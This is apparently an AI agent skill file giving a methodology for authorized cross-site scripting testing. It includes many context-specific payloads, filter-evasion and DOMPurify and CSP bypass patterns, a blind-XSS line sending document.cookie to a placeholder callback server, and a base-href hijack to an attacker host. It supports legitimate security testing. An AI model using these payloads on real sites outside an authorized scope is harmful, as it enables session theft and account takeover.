---
name: xss-hunter
description: "Invoke this skill when the task requires testing for cross-site scripting (XSS) vulnerabilities under authorized engagement: reflected, stored, DOM-based, mutation XSS, and CSP bypass techniques. Covers payload crafting, context-aware injection, browser-verified execution proof, and filter/WAF evasion. A finding is confirmed only when JavaScript execution is demonstrated in a real browser context."
---

# Cross-Site Scripting (XSS) Testing

This skill covers comprehensive XSS testing across all injection contexts and execution models. A finding is not confirmed until actual JavaScript execution is verified in a browser -- alert boxes, DOM mutations, or callback beacons are acceptable proof; response reflection alone is a lead, not a finding.

## Boundaries

| Allowed | Prohibited |
|---|---|
| Injecting XSS payloads into parameters within authorized scope | Testing targets outside the written scope |
| Using benign proof payloads (`alert()`, `console.log()`, DOM writes) | Payloads that exfiltrate real user sessions or credentials |
| Stored XSS in test accounts and sandboxed content areas | Stored XSS that fires against other real users without coordination |
| DOM manipulation proofs via browser dev tools | Persistent defacement or payload injection into production content |
| CSP bypass research and proof-of-concept against test pages | Weaponized exploit chains that deliver malware or phishing |
| Cookie/session demonstration with the tester's own session | Actual session hijacking of other users |
| Blind XSS callbacks to tester-controlled infrastructure | Callbacks that collect data from non-consenting users |

## Phase 0: Pre-engagement setup

1. Confirm target application and endpoints are within authorized scope.
2. Identify the technology stack: server-side framework, client-side framework (React, Angular, Vue), template engine.
3. Map the Content Security Policy: `curl -sI https://target/ | grep -i content-security-policy`.
4. Set up browser testing environment: Chrome/Chromium with dev tools, optionally with a proxy (Burp, mitmproxy).
5. Prepare working directory: `mkdir -p work/xss-hunter/{payloads,proofs,dom-analysis}`.
6. If blind XSS is in scope, set up a callback server (e.g., XSS Hunter, Burp Collaborator, or a simple HTTP listener).

## Phase 1: Reflection and sink mapping

### 1.1 Input reflection discovery

Inject a unique canary string (not a payload) into every input vector and search for it in the response:

```
Canary: xsshunt3r-RANDOM123
```

Test these vectors:
- [ ] GET parameters.
- [ ] POST body parameters (form, JSON, XML).
- [ ] URL path segments.
- [ ] HTTP headers reflected in responses: `Referer`, `User-Agent`, custom headers.
- [ ] URL fragment (for DOM-based: does client-side JS read `location.hash`?).
- [ ] File upload filenames.
- [ ] Error messages that echo input.

### 1.2 Reflection context classification

For each reflection point, determine the rendering context:

| Context | Example reflection | Escape strategy |
|---|---|---|
| HTML body | `<p>CANARY</p>` | Inject tags: `<img src=x onerror=alert(1)>` |
| HTML attribute (unquoted) | `<input value=CANARY>` | Space + event handler: ` onfocus=alert(1) autofocus` |
| HTML attribute (single-quoted) | `<input value='CANARY'>` | Break quote: `' onfocus='alert(1)' autofocus='` |
| HTML attribute (double-quoted) | `<input value="CANARY">` | Break quote: `" onfocus="alert(1)" autofocus="` |
| `href` / `src` attribute | `<a href="CANARY">` | Protocol injection: `javascript:alert(1)` |
| Inside `<script>` block | `var x = "CANARY";` | Break string: `";alert(1)//` or `</script><script>alert(1)//` |
| Inside JS template literal | `` var x = `CANARY`; `` | `${alert(1)}` |
| Inside HTML comment | `<!-- CANARY -->` | Break comment: `--><img src=x onerror=alert(1)>` |
| Inside `<style>` block | `.class { color: CANARY }` | `}</style><img src=x onerror=alert(1)>` |
| JSON response (reflected in page) | `{"data": "CANARY"}` | Context-dependent: may need `</script>` breakout |
| SVG context | `<svg><text>CANARY</text></svg>` | `<svg onload=alert(1)>` |

### 1.3 DOM sink mapping

Search client-side JavaScript for dangerous sinks:

```javascript
// High-risk sinks
document.write()
document.writeln()
element.innerHTML =
element.outerHTML =
element.insertAdjacentHTML()
eval()
setTimeout(string)
setInterval(string)
new Function(string)
document.location =
window.location.href =
location.assign()
location.replace()

// Sources to trace
document.URL
document.documentURI
document.referrer
location.href
location.search
location.hash
window.name
postMessage data
```

Trace each source-to-sink path. If user-controlled data flows from a source to a sink without sanitization, it is a DOM XSS candidate.

## Phase 2: Reflected XSS testing

### 2.1 Context-specific payloads

For each reflection point, craft payloads appropriate to the context identified in Phase 1.

**HTML body context:**
```html
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(document.domain)>
```

**Attribute breakout:**
```html
" autofocus onfocus=alert(document.domain) x="
' autofocus onfocus=alert(document.domain) x='
" onmouseover=alert(document.domain) style="position:fixed;top:0;left:0;width:100%;height:100%" "
```

**JavaScript string context:**
```javascript
";alert(document.domain)//
';alert(document.domain)//
\';alert(document.domain)//
</script><img src=x onerror=alert(document.domain)>
```

**URL/href context:**
```
javascript:alert(document.domain)
data:text/html,<script>alert(document.domain)</script>
```

### 2.2 Filter evasion techniques

If basic payloads are filtered:

```html
<!-- Case variation -->
<ImG sRc=x oNeRrOr=alert(document.domain)>

<!-- Encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">click</a>

<!-- Null bytes and whitespace -->
<img/src=x onerror=alert(1)>
<img%0asrc=x%0aonerror=alert(1)>

<!-- Tag and event variations -->
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>

<!-- Without parentheses -->
<img src=x onerror=alert`1`>
<img src=x onerror=window['alert'](1)>
<img src=x onerror=throw~delete~alert(1)>

<!-- Without alert/confirm/prompt -->
<img src=x onerror=window['al'+'ert'](document.domain)>
<img src=x onerror=top[/al/.source+/ert/.source](1)>
```

### 2.3 Verification protocol

For each candidate payload:
1. Inject the payload via the identified vector.
2. Open the response URL in a real browser (Chrome).
3. Confirm JavaScript execution via: alert dialog, console output, or DOM mutation visible in dev tools.
4. Screenshot or record the proof.

## Phase 3: Stored XSS testing

### 3.1 Injection points for storage

- [ ] User profile fields (name, bio, website, location).
- [ ] Comments, reviews, forum posts.
- [ ] File upload names and metadata.
- [ ] Support tickets, chat messages.
- [ ] Address fields, payment notes.
- [ ] API responses that render in admin panels.

### 3.2 Testing protocol

1. Create a test account (or use the provided test account).
2. Inject context-appropriate payloads into storable fields.
3. Navigate to every page where the stored content renders: profile pages, listing pages, admin panels, email notifications (if HTML), PDF exports, search results.
4. For each rendering location, verify whether the payload executes.
5. Test with a **second browser session** (different browser or incognito) to confirm the stored payload fires for other viewers.

### 3.3 Blind stored XSS

When stored content renders in locations the tester cannot directly access (admin panels, internal dashboards):

1. Use a callback payload:
```html
<img src=x onerror="fetch('https://CALLBACK_SERVER/xss?c='+document.domain)">
<script>new Image().src='https://CALLBACK_SERVER/xss?c='+document.cookie</script>
```
2. Monitor the callback server for incoming requests.
3. The callback URL, timestamp, and document.domain value constitute proof.

## Phase 4: DOM-based XSS testing

### 4.1 Source-to-sink tracing

For each DOM sink identified in Phase 1.3:

1. Set a breakpoint on the sink in browser dev tools.
2. Inject a canary into the corresponding source (URL hash, query param, `window.name`, `postMessage`).
3. Trace the data flow through the breakpoint: is it sanitized, encoded, or passed raw?

### 4.2 DOM XSS payloads

**Via URL fragment (hash):**
```
https://target/page#<img src=x onerror=alert(document.domain)>
https://target/page#"><img src=x onerror=alert(document.domain)>
```

**Via postMessage:**
```javascript
// Open target in iframe, send malicious message
const w = window.open('https://target/page');
setTimeout(() => w.postMessage('<img src=x onerror=alert(document.domain)>', '*'), 2000);
```

**Via window.name:**
```javascript
window.name = '<img src=x onerror=alert(document.domain)>';
window.location = 'https://target/page';
```

### 4.3 Verification

DOM XSS must be verified entirely in the browser. The server response may be completely static; the vulnerability is in client-side code. Record:
- The source (where attacker data enters).
- The sink (where it executes).
- The JS file and line number of the vulnerable code path.

## Phase 5: Mutation XSS (mXSS)

Mutation XSS exploits browser HTML parsing quirks where sanitized HTML is re-parsed and mutated into executable form.

### 5.1 Common mXSS vectors

```html
<!-- Namespace confusion -->
<svg><style><img src=x onerror=alert(1)></style></svg>
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
<svg><foreignObject><div><img src=x onerror=alert(1)></div></foreignObject></svg>

<!-- DOMPurify bypass patterns (version-dependent) -->
<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>
<svg><a><animate attributeName=href values=javascript:alert(1)></animate><text x=20 y=20>click</text></a></svg>
```

### 5.2 When to test for mXSS

- The application uses a client-side HTML sanitizer (DOMPurify, sanitize-html, Angular's `$sce`).
- The sanitized output is inserted via `innerHTML`.
- Rich text editors (CKEditor, TinyMCE, Quill) are in use.

Identify the sanitizer and its version. Check known bypass databases (e.g., Cure53 mXSS paper, DOMPurify changelog).

## Phase 6: CSP bypass techniques

### 6.1 CSP analysis

Parse the policy:
```bash
curl -sI https://target/ | grep -i 'content-security-policy'
```

Evaluate for weaknesses:

| CSP weakness | Bypass technique |
|---|---|
| `script-src 'unsafe-inline'` | Direct inline `<script>` injection |
| `script-src 'unsafe-eval'` | `eval()`, `setTimeout(string)`, `new Function()` |
| `script-src *.googleapis.com` | Host a malicious script on allowed CDN or find JSONP endpoint |
| `script-src 'nonce-VALUE'` with predictable nonce | Predict or extract the nonce from the page, inject `<script nonce=VALUE>` |
| `script-src 'self'` with file upload | Upload a JS file, reference it in `<script src=/uploads/evil.js>` |
| `default-src` missing; no `script-src` | No script restrictions at all |
| `base-uri` missing | `<base href="https://attacker/">` to redirect relative script loads |
| JSONP endpoints on allowed origins | `<script src="https://allowed-cdn/jsonp?callback=alert(1)">` |
| Angular/Vue on allowed CDN | Framework-specific template injection bypasses CSP |

### 6.2 CSP bypass payloads

```html
<!-- base-uri hijack -->
<base href="https://attacker-server/">
<!-- page's relative <script src="app.js"> now loads from attacker -->

<!-- JSONP on whitelisted domain -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>

<!-- Angular template injection (if angular is loaded from allowed source) -->
{{constructor.constructor('alert(document.domain)')()}}

<!-- script-src with 'strict-dynamic' and existing trusted script -->
<!-- If you can inject into a trusted script's input, the trust propagates -->
```

### 6.3 Reporting CSP bypasses

A CSP bypass is a finding modifier, not a standalone finding. Report it attached to the XSS finding it enables: "Reflected XSS in parameter X, CSP bypassed via JSONP on allowed origin Y."

## Phase 7: Browser-specific and edge cases

- [ ] SVG upload with embedded JavaScript: `<svg onload=alert(1)>` in uploaded `.svg` files served with `image/svg+xml`.
- [ ] PDF XSS via injected JavaScript in PDF form fields (if the app generates PDFs from user input).
- [ ] Markdown injection: `[click](javascript:alert(1))` in Markdown renderers that do not sanitize link protocols.
- [ ] AngularJS/Vue/React template injection when user input enters template expressions.
- [ ] Link header injection: `Link: <javascript:alert(1)>; rel=prefetch`.
- [ ] Service Worker registration via XSS for persistence proof (lab/test only).

## Verification requirements

A finding is **confirmed** only when ALL of the following are met:

1. **JavaScript execution proof**: actual JS code ran in a browser context. Acceptable evidence:
   - Screenshot of an `alert()` / `confirm()` / `prompt()` dialog showing `document.domain`.
   - Console log output captured in browser dev tools.
   - Network request to a callback server triggered by the payload.
   - DOM mutation visible in the Elements panel (e.g., injected element present).
2. **Replayable artifact**: a URL, curl command, or step-by-step reproduction that triggers the XSS from scratch.
3. **Context documented**: the injection context (HTML body, attribute, script, DOM sink) and why the payload works there.
4. **Impact classification**: what an attacker can achieve (session theft, account takeover, defacement, phishing, keylogging) given the XSS type and CSP.
5. **For stored XSS**: proof that the payload fires in a second session (different browser/incognito).
6. **For DOM XSS**: the source, sink, JS file, and line number of the vulnerable code path.

## Output format

```markdown
## XSS Finding: [type] in [endpoint/parameter]

**Severity**: Critical / High / Medium
**XSS Type**: Reflected / Stored / DOM-based / Mutation
**Context**: HTML body / attribute / script / DOM sink
**CSP Status**: None / Bypassable (method) / Mitigates (limits impact to...)

### Injection point
- **URL**: https://target/search?q=PAYLOAD
- **Parameter**: q (GET) / comment body (POST) / URL fragment
- **Payload**: `<img src=x onerror=alert(document.domain)>`

### Execution proof
- **Browser**: Chrome 120.0.6099.109
- **Evidence**: [Screenshot / console log / callback request]
- **document.domain value**: target.com

### Reproduction steps
1. Navigate to `https://target/search?q=%3Cimg+src%3Dx+onerror%3Dalert(document.domain)%3E`
2. Observe alert dialog displaying "target.com"

### Impact
- Session cookie is HttpOnly=false; attacker can steal session via `document.cookie`.
- CSP allows inline scripts; no additional bypass needed.
- Stored variant fires on the admin dashboard (confirmed via blind callback).

### Remediation
- Apply context-aware output encoding (HTML entity encoding for HTML body context).
- Set HttpOnly and Secure flags on session cookies.
- Deploy CSP with script-src nonce or hash, without unsafe-inline.
```

## Completion self-check

- [ ] Every reflection point has been tested with context-appropriate payloads.
- [ ] Every confirmed finding has browser-verified execution proof, not just response reflection.
- [ ] DOM sinks have been traced with source identification and JS file/line references.
- [ ] CSP has been analyzed and bypass techniques documented where applicable.
- [ ] Stored XSS findings are verified in a second session.
- [ ] All payloads and reproduction steps are recorded as replayable artifacts.
- [ ] No real user sessions or data were compromised during testing.
